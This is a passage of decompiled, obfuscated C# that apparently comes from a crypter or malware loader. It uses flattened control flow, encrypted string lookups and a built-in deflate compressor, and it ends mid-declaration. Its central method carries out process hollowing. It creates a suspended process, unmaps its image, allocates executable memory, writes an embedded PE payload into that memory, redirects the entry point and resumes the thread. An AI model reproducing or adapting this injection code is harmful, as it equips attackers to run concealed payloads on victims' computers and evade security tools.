	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_7([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_42(Class46 class46_0, Enum4 enum4_0, string string_0, string string_1)
	{
		while (true)
		{
			Delegate20 delegate20_ = class46_0.delegate20_0;
			while (true)
			{
				if (delegate20_ == null)
				{
					return;
				}
				while (true)
				{
					delegate20_(class46_0, new EventArgs3(enum4_0, string_0, string_1));
					int num = 5;
					if (HOU2tiJgKu5JybMaDZ())
					{
						return;
					}
					while (true)
					{
						switch (num)
						{
						default:
							num = 1;
							if (!HOU2tiJgKu5JybMaDZ())
							{
							}
							continue;
						case 1:
						case 2:
							break;
						case 4:
							goto end_IL_002e;
						case 0:
						case 3:
							goto end_IL_004b;
						case 5:
							return;
						}
						break;
					}
					continue;
					end_IL_002e:
					break;
				}
				continue;
				end_IL_004b:
				break;
			}
		}
	}

	static bool smethod_43(bool bool_0, Class33.Class42 class42_0, bool bool_1)
	{
		if (class42_0.int_5 < 262)
		{
			goto IL_015e;
		}
		goto IL_024c;
		IL_024c:
		Class33.Class40 class40_2 = default(Class33.Class40);
		byte[] byte_ = default(byte[]);
		int num2 = default(int);
		int int_2 = default(int);
		Class33.Class40 class40_ = default(Class33.Class40);
		int num4 = default(int);
		int num5 = default(int);
		int int_4 = default(int);
		bool flag = default(bool);
		while (true)
		{
			if (class42_0.int_5 < 262)
			{
				goto IL_0148;
			}
			goto IL_014e;
			IL_014e:
			int num;
			if (class42_0.int_5 != 0)
			{
				if (class42_0.int_4 >= 65274)
				{
					Class12.smethod_57(class42_0);
					num = 2;
					if (HOU2tiJgKu5JybMaDZ())
					{
						goto IL_003b;
					}
					goto IL_00d0;
				}
				goto IL_0126;
			}
			int int_;
			if (class42_0.bool_0)
			{
				class40_ = class42_0.class40_0;
				int_ = class42_0.byte_0[class42_0.int_4 - 1] & 0xFF;
				Class12.smethod_52(int_, class40_);
			}
			class42_0.bool_0 = false;
			class40_2 = class42_0.class40_0;
			byte_ = class42_0.byte_0;
			goto IL_02a5;
			IL_003b:
			if (class42_0.int_2 > num2)
			{
				goto IL_0048;
			}
			Class33.Class40 class40_3 = class42_0.class40_0;
			int int_3 = class42_0.int_4 - 1 - int_2;
			Class12.smethod_107(int_3, num2, class40_3);
			num2 -= 2;
			goto IL_01cf;
			IL_0219:
			class42_0.bool_0 = true;
			class42_0.int_4++;
			class42_0.int_5--;
			goto IL_023c;
			IL_030e:
			int num3 = ((!class42_0.bool_0) ? 1 : 0);
			goto IL_0317;
			IL_0048:
			if (!class42_0.bool_0)
			{
				goto IL_0219;
			}
			class40_ = class42_0.class40_0;
			num = 13;
			if (eDGT3VIwkRhN3e5ONQ())
			{
				goto IL_00d0;
			}
			goto IL_0329;
			IL_023c:
			if (!Class12.smethod_113(class42_0.class40_0))
			{
				continue;
			}
			num4 = class42_0.int_4 - class42_0.int_3;
			goto IL_02f4;
			IL_0126:
			int_2 = class42_0.int_1;
			num2 = class42_0.int_2;
			num = 7;
			if (!eDGT3VIwkRhN3e5ONQ())
			{
				goto IL_00a9;
			}
			goto IL_00d0;
			IL_00d0:
			switch (num)
			{
			case 6:
			case 9:
				goto IL_006b;
			case 4:
				goto IL_00a2;
			case 7:
				goto IL_00a9;
			case 2:
				goto IL_0126;
			case 8:
				goto IL_0148;
			case 11:
				goto end_IL_024c;
			case 13:
				goto IL_0169;
			case 1:
				goto IL_01b5;
			case 10:
				goto IL_01fb;
			case 0:
				goto IL_02a5;
			case 14:
				goto IL_02b6;
			case 3:
			case 5:
				goto IL_02d2;
			case 12:
				goto IL_02f4;
			case 16:
				goto IL_030e;
			case 17:
				goto IL_0329;
			case 18:
				goto IL_0354;
			}
			goto IL_003b;
			IL_02a5:
			int_4 = class42_0.int_3;
			goto IL_02b6;
			IL_02b6:
			int int_5 = class42_0.int_4 - class42_0.int_3;
			Class12.smethod_66(int_4, byte_, bool_1, class40_2, int_5);
			goto IL_02d2;
			IL_02d2:
			class42_0.int_3 = class42_0.int_4;
			return false;
			IL_0169:
			int_ = class42_0.byte_0[class42_0.int_4 - 1] & 0xFF;
			Class12.smethod_52(int_, class40_);
			goto IL_0219;
			IL_0148:
			if (bool_0)
			{
				goto IL_014e;
			}
			goto IL_0354;
			IL_0354:
			return true;
			IL_00a9:
			if (class42_0.int_5 >= 3)
			{
				num5 = Class12.smethod_47(class42_0);
				if (num5 != 0 && class42_0.int_4 - num5 <= 32506)
				{
					goto IL_006b;
				}
			}
			goto IL_00a2;
			IL_01cf:
			class42_0.int_4++;
			class42_0.int_5--;
			goto IL_01b5;
			IL_01b5:
			if (class42_0.int_5 >= 3)
			{
				Class12.smethod_47(class42_0);
			}
			if (--num2 > 0)
			{
				goto IL_01cf;
			}
			class42_0.int_4++;
			goto IL_01fb;
			IL_006b:
			if (Class12.smethod_12(class42_0, num5) && class42_0.int_2 <= 5 && class42_0.int_2 == 3 && class42_0.int_4 - class42_0.int_1 > 4096)
			{
				class42_0.int_2 = 2;
			}
			goto IL_00a2;
			IL_02f4:
			if (class42_0.bool_0)
			{
				num4--;
			}
			if (bool_1 && class42_0.int_5 == 0)
			{
				goto IL_030e;
			}
			num3 = 0;
			goto IL_0317;
			IL_0329:
			int_4 = class42_0.int_3;
			Class12.smethod_66(int_4, byte_, flag, class40_2, num4);
			class42_0.int_3 += num4;
			return !flag;
			IL_0317:
			flag = (byte)num3 != 0;
			class40_2 = class42_0.class40_0;
			byte_ = class42_0.byte_0;
			goto IL_0329;
			IL_01fb:
			class42_0.int_5--;
			class42_0.bool_0 = false;
			class42_0.int_2 = 2;
			goto IL_023c;
			IL_00a2:
			if (num2 >= 3)
			{
				goto IL_003b;
			}
			goto IL_0048;
			continue;
			end_IL_024c:
			break;
		}
		goto IL_015e;
		IL_015e:
		if (!bool_0)
		{
			return false;
		}
		goto IL_024c;
	}

	static void smethod_44(int int_0, Class33.Stream0 stream0_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	static void smethod_45(Class46 class46_0, Enum4 enum4_0)
	{
		Class12.smethod_73(class46_0, enum4_0, string.Empty);
	}

	static bool smethod_46(Class47 class47_0, string string_0)
	{
		try
		{
			byte[] byte_ = class47_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class12.smethod_58(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class12.smethod_112(byte_2, Class32.smethod_0(2474));
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes(Class32.smethod_0(2800));
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static int smethod_47(Class33.Class42 class42_0)
	{
		int num = ((class42_0.int_0 << 5) ^ class42_0.byte_0[class42_0.int_4 + 2]) & 0x7FFF;
		short num2 = (class42_0.short_1[class42_0.int_4 & 0x7FFF] = class42_0.short_0[num]);
		class42_0.short_0[num] = (short)class42_0.int_4;
		class42_0.int_0 = num;
		return num2 & 0xFFFF;
	}

	static bool smethod_48(object[] object_0)
	{
		Class18.Class19 @class = new Class18.Class19();
		Class21.Delegate3 @delegate = Class18.smethod_1<Class21.Delegate3>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(2853)));
		Class21.Delegate4 delegate2 = Class18.smethod_1<Class21.Delegate4>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(2886)));
		Class21.Delegate5 delegate3 = Class18.smethod_1<Class21.Delegate5>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(2947)));
		Class21.Delegate6 delegate4 = Class18.smethod_1<Class21.Delegate6>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(3008)));
		Class21.Delegate7 delegate5 = Class18.smethod_1<Class21.Delegate7>(Class12.smethod_86(Class32.smethod_0(2254)), Class12.smethod_86(Class32.smethod_0(3069)));
		Class21.Delegate8 delegate6 = Class18.smethod_1<Class21.Delegate8>(Class12.smethod_86(Class32.smethod_0(2254)), Class12.smethod_86(Class32.smethod_0(3130)));
		Class21.Delegate9 delegate7 = Class18.smethod_1<Class21.Delegate9>(Class12.smethod_86(Class32.smethod_0(1916)), Class12.smethod_86(Class32.smethod_0(3191)));
		Class21.Delegate10 delegate8 = Class18.smethod_1<Class21.Delegate10>(Class12.smethod_86(Class32.smethod_0(2254)), Class12.smethod_86(Class32.smethod_0(2287)));
		string text = (string)object_0[0];
		byte[] array = (byte[])object_0[1];
		bool flag = (bool)object_0[2];
		bool flag2 = (bool)object_0[3];
		string text2 = (string)object_0[4];
		int bytesRead = 0;
		string text3 = string.Format(Class32.smethod_0(3224), text2);
		Class21.Struct1 startupInfo = default(Class21.Struct1);
		@class.struct0_0 = default(Class21.Struct0);
		startupInfo.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Class21.Struct1)));
		bool result;
		checked
		{
			try
			{
				Class18.Class19.Class20 CS_0024_003C_003E8__locals0 = new Class18.Class19.Class20();
				CS_0024_003C_003E8__locals0.class19_0 = @class;
				int length = default(int);
				bool flag3 = default(bool);
				int num4 = default(int);
				int srcOffset = default(int);
				int num6 = default(int);
				int num8 = default(int);
				int num7 = default(int);
				int num9 = default(int);
				Thread thread = default(Thread);
				short num5 = default(short);
				while (true)
				{
					if (!string.IsNullOrEmpty(text))
					{
						text3 = text3 + Class32.smethod_0(3233) + text;
					}
					if (@delegate(text2, text3, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref @class.struct0_0))
					{
						int num = BitConverter.ToInt32(array, 60);
						int num2 = BitConverter.ToInt32(array, num + 52);
						int[] array2 = new int[179];
						array2[0] = 65538;
						if (delegate4(@class.struct0_0.intptr_1, array2))
						{
							int num3 = array2[41];
							while (true)
							{
								int buffer = 0;
								if (!HOU2tiJgKu5JybMaDZ())
								{
									byte[] bytes;
									switch (1)
									{
									case 13:
										break;
									case 0:
									case 3:
										goto end_IL_0237;
									case 1:
										if (delegate2(@class.struct0_0.intptr_0, num3 + 8, ref buffer, 4, ref bytesRead))
										{
											if (num2 == buffer && delegate6(@class.struct0_0.intptr_0, buffer) != 0)
											{
												throw new Exception();
											}
											length = BitConverter.ToInt32(array, num + 80);
											CS_0024_003C_003E8__locals0.int_1 = BitConverter.ToInt32(array, num + 84);
											flag3 = false;
											CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, num2, length, 12288, 64);
											if (!flag && CS_0024_003C_003E8__locals0.int_0 == 0)
											{
												goto case 2;
											}
											goto IL_0382;
										}
										goto IL_03d9;
									case 2:
										flag3 = true;
										CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, 0, length, 12288, 64);
										goto IL_0382;
									case 5:
										goto IL_03d9;
									case 8:
										goto IL_03df;
									case 4:
										num4++;
										goto IL_03f2;
									case 6:
									case 11:
										srcOffset = BitConverter.ToInt32(array, num6 + 20);
										if (num8 == 0)
										{
											goto IL_03e5;
										}
										goto default;
									default:
									{
										byte[] array3 = new byte[num8 - 1 + 1];
										Buffer.BlockCopy(array, srcOffset, array3, 0, array3.Length);
										if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0 + num7, array3, array3.Length, ref bytesRead))
										{
											throw new Exception();
										}
										goto IL_03e5;
									}
									case 10:
										if (flag3)
										{
											CS_0024_003C_003E8__locals0.int_0 = num2;
										}
										goto case 9;
									case 9:
									{
										array2[44] = CS_0024_003C_003E8__locals0.int_0 + num9;
										if (unchecked((long)delegate5(@class.struct0_0.intptr_1, array2)) != 0L)
										{
											throw new Exception();
										}
										if (flag2)
										{
											new Thread((ThreadStart)delegate
											{
												Thread.CurrentThread.IsBackground = true;
												Class21.Struct0 struct0_ = CS_0024_003C_003E8__locals0.class19_0.struct0_0;
												uint uint_ = (uint)CS_0024_003C_003E8__locals0.int_0;
												int int_ = CS_0024_003C_003E8__locals0.int_1;
												Class12.smethod_34(uint_, int_, struct0_);
											}).Start();
											goto end_IL_02aa;
										}
										uint SuspendCount = 0u;
										if (delegate8(@class.struct0_0.intptr_1, out SuspendCount) == -1)
										{
											throw new Exception();
										}
										thread = new Thread((ThreadStart)delegate
										{
											Class12.smethod_127((int)CS_0024_003C_003E8__locals0.class19_0.struct0_0.uint_0);
										});
										goto case 7;
									}
									case 7:
										thread.IsBackground = true;
										goto case 15;
									case 14:
										goto end_IL_02aa;
									case 15:
										{
											thread.Start();
											goto end_IL_02aa;
										}
										IL_03f2:
										if (num4 <= num5 - 1)
										{
											num7 = BitConverter.ToInt32(array, num6 + 12);
											num8 = BitConverter.ToInt32(array, num6 + 16);
											goto case 6;
										}
										bytes = BitConverter.GetBytes(CS_0024_003C_003E8__locals0.int_0);
										if (!delegate3(@class.struct0_0.intptr_0, num3 + 8, bytes, 4, ref bytesRead))
										{
											throw new Exception();
										}
										num9 = BitConverter.ToInt32(array, num + 40);
										goto case 10;
										IL_0382:
										if (CS_0024_003C_003E8__locals0.int_0 == 0)
										{
											throw new Exception();
										}
										if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0, array, CS_0024_003C_003E8__locals0.int_1, ref bytesRead))
										{
											throw new Exception();
										}
										num6 = num + 248;
										num5 = BitConverter.ToInt16(array, num + 6);
										num4 = 0;
										goto IL_03f2;
										IL_03e5:
										num6 += 40;
										goto case 4;
									}
									continue;
								}
								goto IL_03d9;
								IL_03d9:
								throw new Exception();
								continue;
								end_IL_0237:
								break;
							}
							continue;
						}
						throw new Exception();
					}
					goto IL_03df;
					IL_03df:
					throw new Exception();
					continue;
					end_IL_02aa:
					break;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
				goto IL_056b;
			}
			Thread.Sleep(100);
			return true;
		}
		IL_056b:
		return result;
	}

	static void smethod_49(string string_0, Class47 class47_0, object object_0)
	{
		class47_0.dictionary_0.Add(string_0, object_0);
	}

	static void smethod_50(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6)
	{
		Class12.smethod_138(exception_0, new object[7] { object_0, object_1, object_2, object_3, object_4, object_5, object_6 });
	}

	static int smethod_51(int int_0, int int_1, Class33.Class34 class34_0, byte[] byte_0)
	{
		int num = 0;
		do
		{
			if (class34_0.int_4 != 11)
			{
				int num2 = Class12.smethod_4(int_0, int_1, byte_0, class34_0.class36_0);
				int_1 += num2;
				num += num2;
				int_0 -= num2;
				if (int_0 == 0)
				{
					return num;
				}
			}
		}
		while (Class12.smethod_132(class34_0) || (Class12.smethod_80(class34_0.class36_0) > 0 && class34_0.int_4 != 11));
		return num;
	}

	static bool smethod_52(int int_0, Class33.Class40 class40_0)
	{
		class40_0.short_0[class40_0.int_1] = 0;
		int num = 3;
		if (HOU2tiJgKu5JybMaDZ())
		{
			goto IL_0037;
		}
		goto IL_0065;
		IL_0065:
		switch (num)
		{
		case 0:
		case 3:
			break;
		default:
			goto IL_0037;
		case 4:
			return Class12.smethod_113(class40_0);
		}
		goto IL_001d;
		IL_0037:
		class40_0.class41_0.short_0[int_0]++;
		num = 4;
		if (HOU2tiJgKu5JybMaDZ())
		{
			goto IL_001d;
		}
		goto IL_0065;
		IL_001d:
		class40_0.byte_1[class40_0.int_1++] = (byte)int_0;
		goto IL_0037;
	}

	[DllImport("shell32")]
	internal static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static bool smethod_53(string string_0, EventArgs1 eventArgs1_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class12.smethod_46(eventArgs1_0.class47_0, string_0);
	}

	static void smethod_54(Class33.Class40 class40_0)
	{
		int num = 0;
		int num6 = default(int);
		int num5 = default(int);
		while (num < class40_0.int_1)
		{
			int num2 = class40_0.byte_1[num] & 0xFF;
			while (true)
			{
				int num3 = class40_0.short_0[num];
				if (num3-- != 0)
				{
					int num4 = Class12.smethod_0(class40_0, num2);
					if (HOU2tiJgKu5JybMaDZ())
					{
						break;
					}
					switch (3)
					{
					case 5:
						break;
					case 3:
						Class12.smethod_31(class40_0.class41_0, num4);
						num5 = (num4 - 261) / 4;
						if (num5 > 0 && num5 <= 5)
						{
							Class12.smethod_144(class40_0.class43_0, num2 & ((1 << num5) - 1), num5);
						}
						num6 = Class12.smethod_67(class40_0, num3);
						goto case 2;
					case 2:
					case 6:
						Class12.smethod_31(class40_0.class41_1, num6);
						num5 = num6 / 2 - 1;
						if (num5 > 0)
						{
							goto default;
						}
						goto IL_00e6;
					default:
						Class12.smethod_144(class40_0.class43_0, num3 & ((1 << num5) - 1), num5);
						goto IL_00e6;
					case 1:
					case 4:
						goto IL_00e6;
					case 7:
						goto end_IL_00ea;
					}
					continue;
				}
				Class12.smethod_31(class40_0.class41_0, num2);
				goto IL_00e6;
				IL_00e6:
				num++;
				goto IL_00ea;
			}
			break;
			continue;
			end_IL_00ea:
			break;
			IL_00ea:;
		}
		Class12.smethod_31(class40_0.class41_0, 256);
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_8([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static void smethod_55(IWebProxy iwebProxy_0, Class56 class56_0)
	{
		class56_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_56(Class33.Stream0 stream0_0, int int_0)
	{
		Class12.smethod_44(int_0, stream0_0);
		Class12.smethod_44(int_0 >> 16, stream0_0);
	}

	static void smethod_57(Class33.Class42 class42_0)
	{
		Array.Copy(class42_0.byte_0, 32768, class42_0.byte_0, 0, 32768);
		while (true)
		{
			class42_0.int_1 -= 32768;
			class42_0.int_4 -= 32768;
			class42_0.int_3 -= 32768;
			while (true)
			{
				for (int i = 0; i < 32768; i++)
				{
					int num = class42_0.short_0[i] & 0xFFFF;
					class42_0.short_0[i] = (short)((num >= 32768) ? (num - 32768) : 0);
				}
				int num2 = 0;
				while (true)
				{
					if (num2 < 32768)
					{
						int num3 = class42_0.short_1[num2] & 0xFFFF;
						if (!eDGT3VIwkRhN3e5ONQ())
						{
							break;
						}
						switch (4)
						{
						case 4:
							class42_0.short_1[num2] = (short)((num3 >= 32768) ? (num3 - 32768) : 0);
							num2++;
							break;
						case 0:
						case 1:
							goto end_IL_00b8;
						case 3:
							goto end_IL_00c3;
						}
						continue;
					}
					return;
					continue;
					end_IL_00b8:
					break;
				}
				continue;
				end_IL_00c3:
				break;
			}
		}
	}

	static byte[] smethod_58(byte[] byte_0)
	{
		return Class12.smethod_18((byte[])null, (byte[])null, 1, byte_0);
	}

	static void smethod_59(Class33.Class42 class42_0)
	{
		if (class42_0.int_4 >= 65274)
		{
			Class12.smethod_57(class42_0);
		}
		while (class42_0.int_5 < 262 && class42_0.int_7 < class42_0.int_8)
		{
			int num = 65536 - class42_0.int_5 - class42_0.int_4;
			if (num > class42_0.int_8 - class42_0.int_7)
			{
				num = class42_0.int_8 - class42_0.int_7;
			}
			Array.Copy(class42_0.byte_1, class42_0.int_7, class42_0.byte_0, class42_0.int_4 + class42_0.int_5, num);
			class42_0.int_7 += num;
			class42_0.int_6 += num;
			class42_0.int_5 += num;
		}
		if (class42_0.int_5 >= 3)
		{
			Class12.smethod_10(class42_0);
		}
	}

	static Icon smethod_60(string string_0)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class32.smethod_0(3238) + string_0 + Class32.smethod_0(3299));
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_9([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	static byte[] smethod_61(EventArgs1 eventArgs1_0)
	{
		return Class12.smethod_11(eventArgs1_0.class47_0);
	}

	static void smethod_62(Class33.Class40.Class41 class41_0)
	{
		int num = class41_0.short_0.Length;
		int num2 = 8;
		if (!HOU2tiJgKu5JybMaDZ())
		{
		}
		int[] array = default(int[]);
		int num8 = default(int);
		int num10 = default(int);
		int num5 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		int num14 = default(int);
		int[] array3 = default(int[]);
		int[] array2 = default(int[]);
		int num15 = default(int);
		int num12 = default(int);
		int num11 = default(int);
		int num17 = default(int);
		int num19 = default(int);
		int num7 = default(int);
		int num18 = default(int);
		int num6 = default(int);
		while (true)
		{
			switch (num2)
			{
			case 6:
			{
				int num9;
				if (class41_0.short_0[array[num9 = (num8 - 1) / 2]] > num10)
				{
					array[num8] = array[num9];
					num8 = num9;
					goto case 13;
				}
				goto case 18;
			}
			case 13:
				if (num8 > 0)
				{
					goto case 6;
				}
				goto case 18;
			case 18:
				array[num8] = num5;
				num4 = num5;
				goto IL_0031;
			case 3:
				while (num3 < 2)
				{
					int num13 = ((num4 < 2) ? (++num4) : 0);
					array[num3++] = num13;
				}
				goto case 15;
			case 15:
				class41_0.int_1 = Math.Max(num4 + 1, class41_0.int_0);
				num14 = num3;
				array3 = new int[4 * num3 - 2];
				goto case 5;
			case 5:
				array2 = new int[2 * num3 - 1];
				num15 = num14;
				goto case 4;
			case 4:
				num12 = 0;
				goto default;
			case 10:
				array[num12] = num12;
				num12++;
				goto default;
			default:
				if (num12 < num3)
				{
					int num16 = (array3[2 * num12] = array[num12]);
					array3[2 * num12 + 1] = -1;
					array2[num12] = class41_0.short_0[num16] << 8;
					goto case 10;
				}
				goto IL_010f;
			case 2:
			case 12:
			{
				array3[2 * num11] = num17;
				array3[2 * num11 + 1] = num19;
				int num20 = Math.Min(array2[num17] & 0xFF, array2[num19] & 0xFF);
				num18 = (array2[num11] = array2[num17] + array2[num19] - num20 + 1);
				num7 = 0;
				num6 = 1;
				goto IL_01d7;
			}
			case 7:
				if (array2[array[num6]] > array2[array[num6 + 1]])
				{
					goto case 17;
				}
				goto IL_01c6;
			case 17:
				num6++;
				goto IL_01c6;
			case 0:
				num6 = num7 * 2 + 1;
				goto IL_01d7;
			case 16:
				array[num6] = num11;
				if (num3 <= 1)
				{
					break;
				}
				goto IL_010f;
			case 1:
			case 11:
				if (num6 >= num3)
				{
					num18 = array2[num11];
					while ((num6 = num7) > 0 && array2[array[num7 = (num6 - 1) / 2]] > num18)
					{
						array[num6] = array[num7];
					}
					array[num6] = num11;
					num19 = array[0];
					num11 = num15++;
					goto case 2;
				}
				if (num6 + 1 < num3 && array2[array[num6]] > array2[array[num6 + 1]])
				{
					num6++;
				}
				array[num7] = array[num6];
				num2 = 9;
				if (eDGT3VIwkRhN3e5ONQ())
				{
					continue;
				}
				goto case 3;
			case 9:
				num7 = num6;
				num6 = num6 * 2 + 1;
				goto case 1;
			case 8:
				array = new int[num];
				num3 = 0;
				num4 = 0;
				num5 = 0;
				goto IL_001d;
			case 19:
				break;
				IL_0031:
				num5++;
				goto IL_001d;
				IL_001d:
				if (num5 < num)
				{
					num10 = class41_0.short_0[num5];
					if (num10 == 0)
					{
						goto IL_0031;
					}
					num8 = num3++;
					goto case 13;
				}
				goto case 3;
				IL_010f:
				num17 = array[0];
				num11 = array[--num3];
				num7 = 0;
				num6 = 1;
				goto case 1;
				IL_01c6:
				array[num7] = array[num6];
				num7 = num6;
				goto case 0;
				IL_01d7:
				if (num6 < num3)
				{
					if (num6 + 1 < num3)
					{
						goto case 7;
					}
					goto IL_01c6;
				}
				while ((num6 = num7) > 0 && array2[array[num7 = (num6 - 1) / 2]] > num18)
				{
					array[num6] = array[num7];
				}
				goto case 16;
			}
			break;
		}
		Class12.smethod_125(class41_0, array3);
	}

	static void smethod_63(string string_0, string string_1, EventArgs1 eventArgs1_0)
	{
		Class12.smethod_49(string_1, eventArgs1_0.class47_0, (object)string_0);
	}

	static int smethod_64(Class33.Class36 class36_0)
	{
		return 32768 - class36_0.int_1;
	}

	static void smethod_65(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class12.smethod_138(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static void smethod_66(int int_0, byte[] byte_0, bool bool_0, Class33.Class40 class40_0, int int_1)
	{
		class40_0.class41_0.short_0[256]++;
		Class33.Class40.Class41 class41_ = default(Class33.Class40.Class41);
		short[] short_ = default(short[]);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			Class12.smethod_62(class40_0.class41_0);
			while (true)
			{
				Class12.smethod_62(class40_0.class41_1);
				while (true)
				{
					Class12.smethod_145(class40_0.class41_0, class40_0.class41_2);
					Class12.smethod_145(class40_0.class41_1, class40_0.class41_2);
					Class12.smethod_62(class40_0.class41_2);
					int num = 4;
					for (int num2 = 18; num2 > num; num2--)
					{
						if (class40_0.class41_2.byte_0[Class33.Class40.int_0[num2]] > 0)
						{
							num = num2 + 1;
						}
					}
					int num3 = 14 + num * 3 + Class12.smethod_5(class40_0.class41_2) + Class12.smethod_5(class40_0.class41_0) + Class12.smethod_5(class40_0.class41_1) + class40_0.int_2;
					int num4 = class40_0.int_2;
					while (true)
					{
						for (int i = 0; i < 286; i++)
						{
							num4 += class40_0.class41_0.short_0[i] * Class33.Class40.byte_2[i];
						}
						while (true)
						{
							int num5 = 0;
							while (true)
							{
								if (num5 < 30)
								{
									num4 += class40_0.class41_1.short_0[num5] * Class33.Class40.byte_3[num5];
									num5++;
									continue;
								}
								while (true)
								{
									if (num3 >= num4)
									{
										num3 = num4;
									}
									if (int_0 >= 0 && int_1 + 4 < num3 >> 3)
									{
										goto IL_0125;
									}
									int num6;
									if (num3 != num4)
									{
										Class12.smethod_144(class40_0.class43_0, 4 + (bool_0 ? 1 : 0), 3);
										Class12.smethod_128(num, class40_0);
										Class12.smethod_54(class40_0);
										num6 = 13;
										if (eDGT3VIwkRhN3e5ONQ())
										{
											goto IL_013f;
										}
										goto IL_0263;
									}
									Class12.smethod_144(class40_0.class43_0, 2 + (bool_0 ? 1 : 0), 3);
									goto IL_0211;
									IL_0263:
									Class12.smethod_97(class40_0);
									return;
									IL_013f:
									switch (num6)
									{
									case 12:
										break;
									default:
										continue;
									case 3:
									case 5:
										goto end_IL_0185;
									case 2:
										goto end_IL_018e;
									case 1:
										goto end_IL_0198;
									case 7:
										goto end_IL_019c;
									case 11:
										goto end_IL_01a4;
									case 0:
									case 6:
										goto end_IL_01dd;
									case 4:
										goto IL_0211;
									case 9:
										goto IL_0227;
									case 10:
										return;
									case 13:
										goto IL_0263;
									}
									goto IL_0125;
									IL_0125:
									Class12.smethod_79(int_1, int_0, class40_0, bool_0, byte_0);
									num6 = 10;
									if (HOU2tiJgKu5JybMaDZ())
									{
										goto end_IL_01a4;
									}
									goto IL_013f;
									IL_0211:
									class41_ = class40_0.class41_0;
									short_ = Class33.Class40.short_1;
									byte_ = Class33.Class40.byte_2;
									goto IL_0227;
									IL_0227:
									Class12.smethod_150(byte_, short_, class41_);
									class41_ = class40_0.class41_1;
									short_ = Class33.Class40.short_2;
									byte_ = Class33.Class40.byte_3;
									Class12.smethod_150(byte_, short_, class41_);
									Class12.smethod_54(class40_0);
									Class12.smethod_97(class40_0);
									return;
									continue;
									end_IL_0185:
									break;
								}
								continue;
								end_IL_018e:
								break;
							}
							continue;
							end_IL_0198:
							break;
						}
						continue;
						end_IL_019c:
						break;
					}
					continue;
					end_IL_01a4:
					break;
				}
				continue;
				end_IL_01dd:
				break;
			}
		}
	}

	static int smethod_67(Class33.Class40 class40_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_10([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool StrongNameSignatureVerificationEx_11([MarshalAs(UnmanagedType.LPWStr)] string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0, [MarshalAs(UnmanagedType.Bool)] out bool bool_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
